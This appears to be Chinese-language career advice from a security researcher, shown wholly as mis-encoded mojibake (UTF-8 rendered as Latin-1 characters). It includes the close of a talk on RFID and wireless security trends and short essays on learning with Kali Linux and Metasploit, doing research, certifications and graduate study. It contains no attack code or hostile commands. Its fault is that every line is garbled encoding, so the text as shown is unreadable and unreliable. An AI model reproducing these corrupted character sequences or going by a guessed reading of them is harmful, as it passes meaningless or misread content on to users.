å¾ˆéš¾èˆå¼ƒã€‚ä½†ç³–è¡£å¥½åƒï¼Œç‚®å¼¹éš¾æŒ¡ã€‚ä¿¡æ¯æŠ€æœ¯å‘å±•çš„è¿™ä¹ˆå¿«ï¼Œé…å¥—çš„å®‰å…¨å¾ˆéš¾è·Ÿå¾—ä¸Šã€‚å¤§å®¶æƒ³æƒ³ï¼Œæ±½è½¦å‘æ˜å¤šå°‘å¹´åæ‰æœ‰çš„å®‰å…¨å¸¦ã€å®‰å…¨æ°”å›Šï¼Ÿæœ‰äº†å®‰å…¨å¸¦ã€å®‰å…¨æ°”å›Šï¼Œæ¯å¹´è¿˜è¦è½¦ç¥¸æ­»å¤šå°‘äººï¼Ÿæ¯å¹´è½¦ç¥¸æ­»è¿™ä¹ˆå¤šäººï¼Œå¤§å®¶æ˜¯ä¸æ˜¯è¿˜ä¸€æ ·å¼€è½¦ï¼Ÿè¿™å°±æ˜¯ç‹ç‹¸ç²¾ï¼Œæ­»éƒ½ç¦»ä¸å¼€ã€‚ ä»Šå¹´ä¸–ç•Œæ¯ï¼Œå°±æœ‰äººæå‡ºï¼Œè¦åœ¨æ¯ä¸ªçƒå‘˜èº«ä¸Šè£…RFIDï¼Œå¯¹çƒå‘˜è¿›è¡Œå®æ—¶ç²¾ç¡®å®šä½ï¼Œç”¨æ¥ä½œä¸ºè£åˆ¤çš„è¾…åŠ©ä¾æ®ã€‚è™½ç„¶æœ€åæ²¡æœ‰è¿™ä¹ˆå¹²ï¼Œä½†è¿™ä¸€å¤©è¿Ÿæ—©ä¼šåˆ°æ¥ï¼ˆæ³¨ï¼šåæ¥æ‰çŸ¥é“ï¼Œé©¬æ‹‰æ¾æ¯”èµ›å·²ç»å¼€å§‹ç”¨RFIDæ¥è·Ÿè¸ªé€‰æ‰‹çš„ä½ç½®ï¼‰ã€‚ ï¼ˆæ­¤å¤„çœç•¥å‡ é¡µå¯¹RFIDå®‰å…¨é—®é¢˜ç§‘æ™®è®²è§£çš„PPTå†…å®¹ï¼‰ åˆšæ‰è®²çš„æ¯”è¾ƒç§‘å¹»ã€‚è½åˆ°ç°å®ä¸­æ¥ï¼Œä½ æˆ‘èƒ½çœ‹åˆ°çš„æœªæ¥è‹¥å¹²å¹´ä¸­ï¼Œå¯èƒ½çš„æ–°çƒ­ç‚¹æœ‰ï¼šWi-Fiã€è“ç‰™ã€WiMaxã€UWBç­‰æ— çº¿é€šä¿¡æŠ€æœ¯çš„å®‰å…¨é—®é¢˜ï¼ŒRFIDçš„å®‰å…¨é—®é¢˜ï¼Œæ¶ˆè´¹ç±»ä¸ªäººç”µå­äº§å“çš„å®‰å…¨é—®é¢˜ï¼Œæ•°å­—å®¶ç”µçš„å®‰å…¨é—®é¢˜ï¼Œç­‰ç­‰ã€‚ äººç±»ç¤¾ä¼šç”¨ä¿¡æ¯æŠ€æœ¯è¶Šå¤šï¼Œæ„å‘³ç€è¶Šå¤šçš„çš„è´¢å¯Œå’Œè£èª‰å°†ç”±æ•°å­—ä»‹è´¨æ‰¿è½½ï¼Œè¶Šå¤šçš„é£é™©å°†æ˜¯ä¿¡æ¯å®‰å…¨é£é™©ï¼Œä¿¡æ¯å®‰å…¨æŠ€æœ¯å°±è¶Šé‡è¦ï¼Œè¿™ä¸ªèŒä¸šå°±è¶Šé‡è¦ã€‚ ç°åœ¨å›½å¤–æœ‰ç§èŒä¸šå«ä¿å®‰é¡¾é—®ï¼Œä¿éšœä½ ç°å®ä¸–ç•Œçš„å®‰å…¨ã€‚æœ‰ä¸ºä¼ä¸šæœåŠ¡çš„ï¼Œä¹Ÿæœ‰ä¸ºä¸ªäººæœåŠ¡çš„ã€‚æˆ‘ççŒœä¸€ä¸‹ï¼šåœ¨æœªæ¥ï¼Œå¯èƒ½è¦æœ‰ç±»ä¼¼è¿™æ ·çš„ä¿¡æ¯å®‰å…¨é¡¾é—®ã€‚è€Œä¸”å¯èƒ½æ¯”è¾ƒæ™®åŠï¼Œå°±åƒç°åœ¨å›½å¤–çš„ç§äººåŒ»ç”Ÿã€ç§äººå¾‹å¸ˆä¸€æ ·ã€‚ é€€ä¸€ä¸‡æ­¥è¯´ï¼šä¿¡æ¯å®‰å…¨ä¼ä¸šä¹Ÿè®¸ä¼šæ¶ˆå¤±ï¼Œä½†ä¿¡æ¯å®‰å…¨è¿™ä¸ªèŒä¸šæ°¸è¿œä¸ä¼šæ¶ˆå¤±â€”â€”åªè¦äººç±»è¿˜ä½¿ç”¨ä¿¡æ¯æŠ€æœ¯ã€‚ è°¢è°¢å¤§å®¶ã€‚ å®‰å…¨ç ”ç©¶è€…çš„ä¸ªäººæˆé•¿ ä¸ªäººæˆé•¿ ç¡®ç«‹ä¸ªäººæ–¹å‘ï¼Œç»“åˆå·¥ä½œå†…å®¹ï¼Œæ‰¾å‡ºå¯¹åº”çŸ­æ¿ è¯¥é¢†åŸŸä¸»è¦ä¸“å®¶ä»¬çš„å·¥ä½œæ˜¯å¦éƒ½äº†è§£ï¼Ÿ ç›¸å…³ç½‘ç»œåè®®ã€æ–‡ä»¶æ ¼å¼æ˜¯å¦ç†Ÿæ‚‰ï¼Ÿ ç›¸å…³çš„æŠ€æœ¯å’Œä¸»è¦å·¥å…·æ˜¯å¦çœ‹è¿‡ã€ç”¨è¿‡ï¼Ÿ é˜…è¯»åªæ˜¯å­¦ä¹ è¿‡ç¨‹çš„èµ·ç‚¹ï¼Œä¸èƒ½æ­¢äºé˜…è¯» å·¥å…·çš„æ¯ä¸ªå‚æ•°æ¯ä¸ªèœå•éƒ½è¦çœ‹ã€è¦è¯• å­¦ä¹ ç½‘ç»œåè®®è¦å®é™…æŠ“åŒ…åˆ†æï¼Œå­¦ä¹ æ–‡ä»¶æ ¼å¼è¦è¯»ä»£ç å®ç° å­¦ä¹ è€æ¼æ´ä¸€å®šè¦è°ƒè¯•ï¼Œææ‡‚åˆ«äººä»£ç æ¯ä¸€ä¸ªå­—èŠ‚çš„æ„ä¹‰ï¼Œä¹‹åè¦å®Œå…¨è‡ªå·±é‡å†™ä¸€ä¸ªExploit ç»†èŠ‚ã€ç»†èŠ‚ã€ç»†èŠ‚ï¼Œåˆ¨æ ¹é—®åº• å»ºç«‹å­¦ä¹ å‚è€ƒç›®æ ‡ çŸ­æœŸå‚è€ƒä»€ä¹ˆï¼Ÿæ¯”è‡ªå·±ä¼˜ç§€çš„åŒé¾„äºº é˜…è¯»ä»–ä»¬çš„æ–‡ç« å’Œå…¶ä»–å·¥ä½œæˆæœï¼Œä»ç»†èŠ‚ä¸­è§‚å¯Ÿä»–ä»¬çš„å­¦ä¹ æ–¹å¼å’Œå·¥ä½œæ–¹å¼ ä¸­æœŸå‚è€ƒä»€ä¹ˆï¼Ÿä½ çš„æ–¹å‘ä¸Šçš„ä¸šå†…ä¸“å®¶ äº†è§£ä»–ä»¬çš„æˆé•¿è½¨è¿¹ï¼Œè·Ÿè¸ªä»–ä»¬å…³æ³¨çš„å†…å®¹ é•¿æœŸå‚è€ƒä»€ä¹ˆï¼Ÿä¸šå†…è€ç‰Œä¼ä¸šå’Œå…ˆé”‹ä¼ä¸š æŠŠæ¡è¡Œä¸šå‘å±•ã€æŠ€æœ¯è¶‹åŠ¿ï¼Œä¸ºæœªæ¥åšç§¯ç´¯ æ¨èçš„å­¦ä¹ æ–¹å¼ ä»¥å·¥å…·ä¸ºçº¿ç´¢ ä¸€ä¸ªæ¯”è¾ƒçœäº‹çš„å­¦ä¹ ç›®å½•ï¼šKali Linux å­¦ä¹ æ€è·¯ï¼Œä»¥Metasploitä¸ºä¾‹ï¼š éå†æ¯ä¸ªå­ç›®å½•ï¼Œé™¤äº†Exploité‡Œé¢è¿˜æœ‰ä»€ä¹ˆï¼Ÿ æ¯ä¸ªå·¥å…·åˆ†åˆ«æœ‰ä»€ä¹ˆåŠŸèƒ½ï¼ŸåŸç†æ˜¯ä»€ä¹ˆï¼Ÿæ¶‰åŠå“ªäº›çŸ¥è¯†ï¼Ÿ èƒ½å¦æ”¹è¿›ä¼˜åŒ–ï¼Ÿèƒ½å¦å‘å±•ï¼Œç»„åˆå‡ºæ–°çš„åŠŸèƒ½ï¼Ÿ ä»¥ä¸“å®¶ä¸ºçº¿ç´¢ ä½ çš„æŠ€æœ¯æ–¹å‘é‡Œæœ‰å“ªäº›ä¸“å®¶ï¼Ÿ ä»–ä»¬çš„é‚®ç®±ã€ä¸»é¡µã€ç¤¾äº¤ç½‘ç»œå¸å·æ˜¯ä»€ä¹ˆï¼Ÿ ä»–ä»¬åœ¨è¯¥æ–¹å‘ä¸Šæœ‰å“ªäº›ä½œå“ï¼Ÿå‘è¡¨è¿‡å“ªäº›æ¼”è®²ï¼Ÿ è·Ÿè¸ªå…³æ³¨ï¼Œä¸€ä¸ªä¸€ä¸ªå­¦ å¤„ç†å¥½å­¦ä¹ ã€å·¥ä½œå’Œç”Ÿæ´» å­¦ä¹ ã€å·¥ä½œå’Œç”Ÿæ´»æ˜¯çŸ›ç›¾ç»Ÿä¸€çš„ ä¸‰è€…éƒ½éœ€è¦æ—¶é—´ï¼Œä½ ä¸€å¤©åªæœ‰24å°æ—¶ è°ƒå’ŒçŸ›ç›¾çš„å…³é”®ï¼šæé«˜æ•ˆç‡ å¯¹æ²¡æœ‰ä¸€ä¸ªå¥½çˆ¸çˆ¸çš„äººæ¥è¯´ï¼Œä½ çš„å­¦ä¹ ã€å·¥ä½œä¼šå½±å“ä½ èƒ½ä¸èƒ½è¿½æ±‚è¯—å’Œè¿œæ–¹ æœ‰å¥½çˆ¸çˆ¸ä¹Ÿè¦å­¦ä¹ ï¼Œå› ä¸ºèƒ½åŠ›ä¹‹å¤–çš„èµ„æœ¬ç­‰äºé›¶ï¼š å¦‚ä½•æé«˜æ•ˆç‡ åšå¥½é¢„ç ”ï¼Œæ”¶é›†ç›¸å…³å‰äººæˆæœï¼Œé¿å…æ— è°“çš„é‡å¤åŠ³åŠ¨ åœ¨å¯è¡Œæ€§åˆ¤æ–­é˜¶æ®µï¼Œèƒ½æ‰¾åˆ°å·¥å…·å°±ä¸å†™ä»£ç ï¼Œèƒ½æœ‰è„šæœ¬è¯­è¨€å†™å°±ä¸è¦ç”¨ç¼–è¯‘è¯­è¨€ï¼ŒæŠŠå®Œç¾ä¸»ä¹‰æ”¾åœ¨æœ€ç»ˆå®ç°é˜¶æ®µ åšå¥½ç¬”è®°å¹¶å®šæœŸæ•´ç†ï¼Œé—å¿˜ä¼šè®©æ‰€æœ‰çš„æŠ•å…¥éƒ½ç™½ç™½æµªè´¹ å¤šå’ŒåŒäº‹äº¤æµï¼Œåˆ«äººè¯´ä¸€ä¸ªå·¥å…·çš„åå­—å¯èƒ½è®©ä½ èŠ‚çº¦æ•°å°æ—¶ å’–å•¡å¯ä»¥æé«˜æ€ç»´æ•ˆç‡ï¼Œè€Œä¸”åˆæ³• æ— è®ºæ€ä¹ˆæé«˜æ•ˆç‡ï¼Œè¦æˆä¸ºä¸“å®¶ï¼Œéƒ½éœ€è¦å¤§é‡çš„æ—¶é—´æŠ•å…¥ å¦‚ä½•å­¦ä¹  å­¦æ ¡æ•™è‚²çš„æ–¹å¼æ˜¯ï¼šç”±æµ…å…¥æ·±ï¼Œå…ˆç†è®ºå†å®è·µï¼Œå¤šé—¨åŸºç¡€è¯¾ä¸€èµ·å¹³é¢æ¨è¿›ã€‚è¿™ç§æ–¹å¼çš„å¥½å¤„æ˜¯å­¦å¾—æ‰å®ï¼Œé€‚åˆæ‰¹é‡åŸ¹å…»äººã€‚ç¼ºç‚¹æ˜¯å‡ºæ´»å„¿æ…¢ï¼Œæ²¡æœ‰åˆ©ç”¨äººçš„å†…é©±åŠ›ã€‚ å¸ˆå‚…å¸¦å¾’å¼Ÿæˆ–è€…è‡ªå­¦çš„æƒ…å†µä¸‹å°±ä¸ä¸€å®šè¦æŒ‰æ‰¹é‡æ•™å­¦çš„æ–¹å¼æ¥ã€‚ æˆ‘ä¸ªäººçš„ç»éªŒæ˜¯ä¸ç®¡ä¼šä¸ä¼šï¼Œå…ˆåŠ¨æ‰‹æèµ·æ¥ã€‚è€Œä¸”ä¸æå¤ªå…¥é—¨çš„ï¼Œè¦éš¾åº¦ä¸­ç­‰ï¼Œè¿™æ ·æ‰æœ‰æˆå°±æ„Ÿï¼Œèƒ½å½¢æˆæ­£åé¦ˆï¼Œè°ƒåŠ¨å†…é©±åŠ›ã€‚è¿‡ç¨‹ä¸­ä¼šé‡åˆ°å¾ˆå¤šä¸æ‡‚çš„ä¸œè¥¿ï¼Œæ²¡å…³ç³»ï¼Œé‡åˆ°ä»€ä¹ˆå°±å»å­¦ä»€ä¹ˆã€‚è¿™ä¸ªé˜¶æ®µä¸æ±‚å¤šæ±‚å…¨ï¼Œä»¥æŠŠæ‰‹å¤´çš„ä¸œè¥¿æèµ·æ¥ä¸ºç›®æ ‡ã€‚ææˆäº†å†è®¾å®šä¸€ä¸ªæ›´éš¾çš„æ–°ç›®æ ‡ã€‚æ–°è€ç›®æ ‡ä¹‹é—´è¦æœ‰ç»§æ‰¿æ€§ã€‚æœ€åç­‰é«˜éš¾åº¦ç›®æ ‡ä¹Ÿèƒ½æå®šäº†ï¼Œå†è½¬è¿‡å¤´ç³»ç»Ÿæ€§åœ°å»çœ‹çœ‹ç›¸å…³æŠ€æœ¯èµ„æ–™ï¼ŒåŠ å›ºä¸€ä¸‹åœ°åŸºã€‚ å¦‚ä½•ç ”ç©¶ åå‡ å¹´å‰æµè¡Œè¿‡ä¸€ç¯‡æ–‡ç« å«ã€ŠæŠŠä¿¡å¸¦ç»™åŠ è¥¿äºšã€‹ã€‚å‰äº›å¹´åˆæµè¡Œè¿‡æ‰¹åˆ¤è¿™ç¯‡æ–‡ç« ã€‚ç ”ç©¶å·¥ä½œå¤§å¤šå’Œé‚£ä½é€ä¿¡è€…é¢ä¸´çš„æƒ…å†µå·®ä¸å¤šï¼šæœ‰ä¸€å°ä¿¡äº¤ç»™ä½ ï¼Œè®©ä½ é€ç»™åŠ è¥¿äºšã€‚åŠ è¥¿äºšåœ¨å“ªå„¿ï¼Ÿæ²¡äººçŸ¥é“ã€‚ä½ å¾—è‡ªå·±æ‰¾ï¼ŒæŠŠä¿¡é€åˆ°ã€‚ åšç ”ç©¶å·¥ä½œï¼Œç¬¬ä¸€æ­¥æ˜¯èµ„æ–™æŸ¥æ‰¾ã€‚è¿™æ˜¯ä»äº‹ç ”ç©¶æ¢ç´¢æœ€åŸºç¡€çš„èƒ½åŠ›ï¼Œéå¸¸é‡è¦ã€‚è€Œä¸”ä¹Ÿæ²¡æœ‰æƒ³è±¡çš„é‚£ä¹ˆç®€å•ï¼Œå¹¶ä¸æ˜¯æ¯æ¬¡æŠŠæƒ³é—®çš„é—®é¢˜è¾“å…¥æœç´¢å¼•æ“éƒ½èƒ½å¾—åˆ°ç­”æ¡ˆã€‚æ‰€ä»¥æ²¡æ‰¾åˆ°ç­”æ¡ˆå¯èƒ½ä¸æ˜¯æ²¡æœ‰ç­”æ¡ˆã€‚å…·ä½“ç”¨å“ªäº›å…³é”®è¯ã€æ€ä¹ˆç»„åˆè¿™äº›è¯ã€æ€ä¹ˆæ ¹æ®ç¬¬ä¸€æ­¥æœç´¢ç»“æœä¸­çš„çº¿ç´¢å†æå–å…³é”®è¯ã€æ€ä¹ˆåˆ¤æ–­æœç´¢ç»“æœæœ‰æ•ˆæ€§ï¼Œç­‰ç­‰ï¼Œè¿™äº›éƒ½éœ€è¦åå¤å®è·µå’Œå½’çº³æ€è€ƒã€‚ é€šè¿‡èµ„æ–™æŸ¥æ‰¾ï¼Œå°±å¯ä»¥çŸ¥é“æ˜¯å¦æœ‰äººåšè¿‡ç±»ä¼¼å·¥ä½œï¼Œæ˜¯å¦æœ‰å¯ç›´æ¥å‚è€ƒçš„èµ„æ–™ã€‚æœ‰æ—¶å€™ä½ ä¼šå‘ç°å…¨ä¸–ç•Œä¹Ÿæ²¡äººåšè¿‡ç±»ä¼¼å·¥ä½œã€‚è¿™æ—¶å°±éœ€è¦é’ˆå¯¹ç›®æ ‡ï¼Œè¿›è¡Œè·¯å¾„åˆ†æï¼Œçœ‹çœ‹æœ‰å“ªäº›è·¯å¯èƒ½é€šå¾€ç›®æ ‡ï¼Œç„¶åå†é’ˆå¯¹è¿™äº›åˆ†è§£å‡ºçš„è·¯å¾„å†è¿›è¡Œèµ„æ–™æŸ¥æ‰¾ã€‚ è¿™ç§ç›®æ ‡åˆ†è§£æœ‰æ—¶å€™ä¼šä¸æ­¢ä¸€å±‚ã€‚ä¹Ÿå°±æ˜¯è¯´é‚£äº›åˆ†è§£å‡ºæ¥çš„è·¯å¾„ä¹Ÿå¯èƒ½æ²¡æœ‰èµ„æ–™ã€‚é‚£å°±éœ€è¦é’ˆå¯¹è·¯å¾„å†ä½œè·¯å¾„åˆ†è§£ã€‚ç„¶åéå†è¿™äº›è·¯å¾„ã€‚ ä»å†å²ç»éªŒçœ‹ï¼Œå¤©åˆ†é«˜ã€è„‘å­å¿«ã€æ‰‹é€Ÿå¿«ã€å¯¹æŠ€æœ¯è·¯å¾„æœ‰æ•é”ç›´è§‰çš„äººï¼Œå½“ç„¶èƒ½å¹²å¾—å¿«ä¸€äº›ã€‚è€Œä¸€èˆ¬äººåªè¦æ„¿æ„åšæŒéå†è·¯å¾„ï¼Œèƒ½æ‰›å¾—ä½é•¿æœŸå¾—ä¸åˆ°æ­£åé¦ˆï¼Œå¤§éƒ¨åˆ†ä¹Ÿèƒ½å¹²å‡ºæˆç»©ã€‚å°±æ˜¯ä¼šç—›è‹¦ä¸€äº›ã€‚åˆ«äººä¹åœ¨å…¶ä¸­ï¼Œä½ è‹¦åœ¨å…¶ä¸­ã€‚ä¸æ€•è‹¦çš„è¯ä¹Ÿè¡Œã€‚ å¦‚ä½•æˆé•¿ åˆšå‚åŠ å·¥ä½œçš„æ—¶å€™ï¼Œéƒ¨é—¨æ¥åˆ°å„ç±»ä»»åŠ¡ï¼Œé¢†å¯¼é—®æˆ‘èƒ½ä¸èƒ½å¹²ï¼Œæˆ‘ä¸€èˆ¬éƒ½è¯´è®©æˆ‘å»è¯•è¯•å§ã€‚ç„¶åæŠ“ç´§æ—¶é—´æŸ¥èµ„æ–™ï¼Œå­¦ä¹ å’Œè¿™é¡¹å·¥ä½œæœ‰å…³çš„å†…å®¹ã€‚ å‹‡æ•¢æ¥å—å·¥ä½œæŒ‘æˆ˜ï¼Œå¯ä»¥è®©äººå¿«é€Ÿæˆé•¿ã€‚ä¹Ÿä¼šè®©ä½ æœ‰æ›´å¤šçš„æœºä¼šï¼Œè¿™æ˜¯ä¸ªé©¬å¤ªæ•ˆåº”çš„äº‹å„¿ã€‚æˆ‘è®°å¾—å½“æ—¶çš„é¢†å¯¼ç»™è¿‡æˆ‘è¿™æ ·ä¸€ä¸ªè¯„è¯­ï¼šâ€œä¸ç®¡ä»€ä¹ˆå·¥ä½œï¼Œäº¤ç»™ä½ æˆ‘å°±æ”¾å¿ƒäº†ï¼Œåæ­£ä½ æ€»æœ‰åŠæ³•æå®šâ€ã€‚ å½“ç„¶ä¹Ÿè¦äº†è§£æ¸…æ¥šéœ€æ±‚ï¼Œç‰¹åˆ«æ˜¯å¯¹æ—¶é—´çš„è¦æ±‚ï¼Œè¯„ä¼°å¥½æ˜¯å¦åœ¨è‡ªå·±è·³ä¸€è·³èƒ½å¤Ÿå¾—ç€çš„èŒƒå›´å†…ã€‚ æ•²ä»£ç çš„ï¼Œå¦‚ä½•è½¬è¡ŒæŒ–æ˜æ¼æ´ï¼Ÿ â€œæœ¬äººå†™äº†äº”å…­å¹´Linux Cï¼Œåº”ç”¨å±‚ä¸šåŠ¡ä¸ºä¸»ï¼ŒæŠ€æœ¯å«é‡ä¸ç®—å¤ªé«˜ï¼›Cè¯­è¨€æ¯”è¾ƒç†Ÿç»ƒï¼ŒC++ä»…åšè¿‡Winä¸‹MFCçš„ç®€å•é¡¹ç›®ï¼›Linux kernelå¤§è‡´äº†è§£ï¼Œå†™è¿‡ç®€å•çš„é©±åŠ¨ï¼›å¯¹äºç†è®ºã€ç®—æ³•ä¹‹ç±»çš„æ¯”è¾ƒè–„å¼±ã€‚æ˜¯å¦å¯è½¬è¡ŒLinuxæˆ–Winä¸‹æ¼æ´æŒ–æ˜ï¼Ÿè¿˜éœ€è¦è¡¥å……ç‚¹ä»€ä¹ˆçŸ¥è¯†ï¼Ÿå¤šè°¢å‰è¾ˆä»¬çš„æŒ‡ç‚¹ã€‚â€ ç»™ä½ ä¸ªå»ºè®®ï¼šåˆ«æƒ³é‚£ä¹ˆå¤šï¼Œå…ˆå¹²èµ·æ¥å†è¯´ã€‚ æˆ‘æ‰¾åˆ°ç¬¬ä¸€ä¸ªæ¼æ´çš„æ—¶å€™ï¼Œè¿˜åœ¨åŒ»é™¢å®ä¹ ï¼Œåªä¼šå†™å‡ è¡Œæ‰¹å¤„ç†ã€‚ä¸ºäº†å†™ PoC éœ€è¦å­¦ç¼–ç¨‹è¯­è¨€ï¼Œçœ‹ç”µè„‘æŠ¥ä»‹ç»è¿‡ Perlï¼Œå°±å»ä¹°äº†æœ¬ã€ŠPerl ç¼–ç¨‹ 24 å­¦æ—¶æ•™ç¨‹ã€‹ã€‚åæ¥ä¸ºäº†å†™æ›´å¥½çš„ Exploit å­¦äº† C è¯­è¨€ã€‚å†åæ¥ï¼Œä¸ºäº†å„ç§ç ”ç©¶è¯»å„ç§ RFCã€è°ƒå„ç§ç¨‹åºã€è¯»å„ç§ä»£ç ã€è¯•å„ç§å·¥å…·ï¼Œç­‰ç­‰ã€‚å¹²è¿™è¡Œï¼Œä½ æ°¸è¿œä¸çŸ¥é“æœªæ¥éœ€è¦ä¼šä»€ä¹ˆã€‚æ‰€ä»¥ä»€ä¹ˆéƒ½å¯ä»¥ä¸ä¼šï¼Œä½†ä¸èƒ½å­¦ä¸ä¼šã€‚ ç¨‹åºå‘˜å¦‚ä½•åˆ¤æ–­è‡ªå·±æ˜¯å¦é€‚åˆåšå®‰å…¨ç ”ç©¶ æœ‰äººè·Ÿæˆ‘è¯´ä»¥å‰æ˜¯ç¨‹åºå‘˜ï¼Œé—®èƒ½å¦è½¬å¹²å®‰å…¨ç ”ç©¶ã€‚æˆ‘é—®ä»–æœ‰æ²¡æœ‰è‡ªå·±ç ”ç©¶è¿‡ä»€ä¹ˆï¼Œä»–è¯´è¿˜æ²¡æœ‰ï¼Œä½†ä¸€ç›´å¾ˆæ„Ÿå…´è¶£ã€‚ç„¶åæˆ‘é—®ä»–æ„Ÿå…´è¶£äº†å¤šå°‘å¹´ï¼Œä»–å°±æ²‰é»˜äº†ã€‚å½“ç„¶ï¼Œè¿™è‡³å°‘è¯´æ˜ä»–è„‘å­å¾ˆå¿«ï¼Œè¿…é€ŸçŸ¥é“æˆ‘æƒ³è¡¨è¾¾ä»€ä¹ˆï¼šå¤©å¤©å¯¹ç€ç”µè„‘ï¼ŒçœŸæ„Ÿå…´è¶£æ€ä¹ˆå¯èƒ½ä»æ¥æ²¡ç ”ç©¶è¿‡â€”â€”ä½ è·Ÿæ—å¿—ç²ç¡ä¸€ä¸ªåºŠèƒ½å¥½å‡ å¹´ä¸€ç›´ç›–æ£‰è¢«çº¯èŠå¤©ï¼Ÿ ç½‘ç»œå®‰å…¨åˆå­¦è€…åº”è¯¥çœ‹ä»€ä¹ˆä¹¦ å‰é˜µå­é‡åˆ°ä¸€ä¸ªå¯¹ç½‘ç»œå®‰å…¨æ„Ÿå…´è¶£çš„ä¸­å­¦ç”Ÿï¼Œè®©æˆ‘æ¨èä¸€æœ¬ä¹¦ã€‚æˆ‘å‘Šè¯‰ä»–ï¼š éšä¾¿æ‰¾ä¸€ä¸ªä¹¦åº—ï¼Œåœ¨ç½‘ç»œå®‰å…¨åˆ†ç±»ä¸‹é¢éšä¾¿æ‰¾ä¸€æœ¬ä¹¦ï¼Œç„¶åä»ç¬¬ä¸€é¡µå¼€å§‹å­¦ã€‚ å¦‚æœè§‰å¾—å­¦ä¸ä¸‹å»ï¼Œé‚£å¯èƒ½æ˜¯ä¹¦æœ‰é—®é¢˜ï¼Œå°±æ¢ä¸€æœ¬ã€‚ å¦‚æœæ¢ä¸€æœ¬è¿˜æ˜¯å­¦ä¸ä¸‹å»ï¼Œå°±å†æ¢ä¸€æœ¬ã€‚ å¦‚æœæ¢äº†ä¸‰å››æœ¬éƒ½è¿˜å­¦ä¸ä¸‹å»ï¼Œå¯èƒ½å°±ä¸æ˜¯ä¹¦çš„é—®é¢˜ã€‚ å¦‚æœèƒ½å­¦å¾—ä¸‹å»ï¼Œç­‰è¿™æœ¬ä¹¦å­¦å®Œï¼Œæ¥ä¸‹æ¥è¯¥å­¦ä»€ä¹ˆï¼Œä½ ä¼šæœ‰è‡ªå·±çš„æƒ³æ³•ï¼Œä¸éœ€è¦å†é—®åˆ«äººäº†ã€‚ ä¿¡æ¯å®‰å…¨æ–¹å‘å°±ä¸šè¦è€ƒå“ªäº›è¯ä¹¦ è¿™ä¸ªé—®é¢˜é—®å¾—å¾ˆç¬¼ç»Ÿï¼Œå¦‚æœä¹Ÿç¬¼ç»Ÿå›ç­”çš„è¯ï¼Œåªèƒ½è¯´ï¼šä¿¡æ¯å®‰å…¨ä¸“ä¸šå­¦ç”Ÿå¦‚æœä»¥åæƒ³ä»äº‹ä¸“ä¸šå¯¹å£çš„å·¥ä½œï¼Œéœ€è¦ä¿¡æ¯å®‰å…¨ä¸“ä¸šæŠ€èƒ½ï¼Œå¾ˆå¤šè¯ä¹¦éƒ½å¯ä»¥æé«˜å°±ä¸šæœºä¼šã€‚ å…·ä½“ä¸¾ä¾‹å­æ¥è¯´çš„è¯â€”â€”æ¯”å¦‚åœ¨å›½å†…ä¹™æ–¹å°±ä¸šï¼ŒCISP æ˜¯æœ‰ç”¨çš„ã€‚å› ä¸ºå®‰å…¨ä¼ä¸šå¦‚æœè¦ç”³è¯·ä¿¡æ¯å®‰å…¨æœåŠ¡èµ„è´¨ï¼Œå°±éœ€è¦è‹¥å¹²åæœ‰ CISP è¯ä¹¦çš„å‘˜å·¥ã€‚è€Œå¾ˆå¤šç”²æ–¹æ‹›æ ‡ä¼šè¦æ±‚ä¹™æ–¹ä¼ä¸šæœ‰ç›¸å…³èµ„è´¨ã€‚ æ‰€ä»¥é¡ºç€è¿™ä¸ªæ€è·¯ï¼Œå¯ä»¥å»æŸ¥æŸ¥å„å®‰å…¨é¡¹ç›®çš„æ‹›æ ‡å…¬å‘Šï¼Œçœ‹çœ‹å¯¹ä¼ä¸šè¦æ±‚äº†ä»€ä¹ˆï¼Œå†æŸ¥æŸ¥ä¼ä¸šå¦‚æœè¦å…·å¤‡è¿™äº›è¦æ±‚ï¼Œéœ€è¦æœ‰ä»€ä¹ˆè¯ä¹¦çš„å‘˜å·¥ã€‚é‚£ä¹ˆè¿™äº›è¯ä¹¦å°±æ˜¯æ˜¾è‘—æœ‰åˆ©äºæé«˜å°±ä¸šæœºä¼šçš„ã€‚ ä¿¡æ¯å®‰å…¨ä¸“ä¸šæœ‰å¿…è¦è€ƒç ”å— å¦‚æœç¡®å®å¯¹å®‰å…¨æŠ€æœ¯å¾ˆæ„Ÿå…´è¶£ï¼Œè‡ªå·±è¯»äº†å¾ˆå¤šèµ„æ–™ï¼Œå†™äº†å¾ˆå¤šä»£ç ï¼Œåšäº†å¾ˆå¤šç ”ç©¶ï¼Œé‚£æœªå¿…è¦è€ƒç ”ã€‚ å¦‚æœä½ ä¸å±äºå‰ä¸€ç§äººï¼Œåˆæƒ³å¹²è¿™è¡Œï¼Œé‚£è·Ÿç€å¯¼å¸ˆåšå‡ å¹´é¡¹ç›®è¿˜æ˜¯æœ‰å¥½å¤„çš„ã€‚ å­¦é™¢æ´¾çš„ä¿¡æ¯å®‰å…¨æŒ‡çš„ä»€ä¹ˆï¼Ÿ â€œåœ¨å„ä¸ªå®‰å…¨æŠ€æœ¯çš„ç¾¤é‡Œæ„Ÿè§‰å·²ç»æ²¡åŠæ³•äº¤æµäº†ã€‚æˆ‘ç ”ç©¶çš„æ˜¯ä¿¡æ¯å®‰å…¨çš„æ¡†æ¶ã€é¡¶å±‚è®¾è®¡ã€æ•´ä½“çš„è§£å†³æ–¹æ¡ˆï¼Œå¹³æ—¶ä¹ŸèŠ±ä¸å°‘æ—¶é—´è·Ÿè¿›æŠ€æœ¯ã€‚ä½†æ˜¯é‡åˆ°è¿‡å¤šæ¬¡ï¼Œæˆ‘è¯´äº†è‡ªå·±çš„ä¸€äº›è§‚ç‚¹ï¼Œå°±æ‹›æ¥å˜²è®½ï¼Œè¯´æˆ‘æ˜¯å­¦é™¢æ´¾ï¼Œæ»¡æ˜¯é„™å¤·å£å»ã€‚ä¸ºä»€ä¹ˆä¼šæ˜¯è¿™æ ·çš„å±€é¢ï¼Ÿç†è®ºæŒ‡å¯¼å®è·µï¼Œå®è·µè¯æ˜ç†è®ºï¼Œå¦‚æœæ˜¯å­¦é™¢æ´¾æŒ‡çš„æ˜¯ç ”ç©¶ä¿¡æ¯å®‰å…¨ç†è®ºçš„äººï¼Œé‚£è¿™æ ·çš„å±€é¢æ˜¾ç„¶ä¸åˆ©äºä¿¡æ¯å®‰å…¨è¡Œä¸šçš„å‘å±•ã€‚â€ æˆ‘ä»¬å¸¸æŠŠä»äº‹ä¿¡æ¯å®‰å…¨æŠ€æœ¯ç ”ç©¶çš„äººåˆ†ä¸ºå­¦é™¢æ´¾å’Œå·¥ä¸šæ´¾ï¼Œåˆ†åˆ«æŒ‡æ›´åå‘äºç†è®ºçš„ç ”ç©¶è€…ï¼Œå’Œæ›´åå‘äºå®è·µçš„ç ”ç©¶è€…ã€‚ 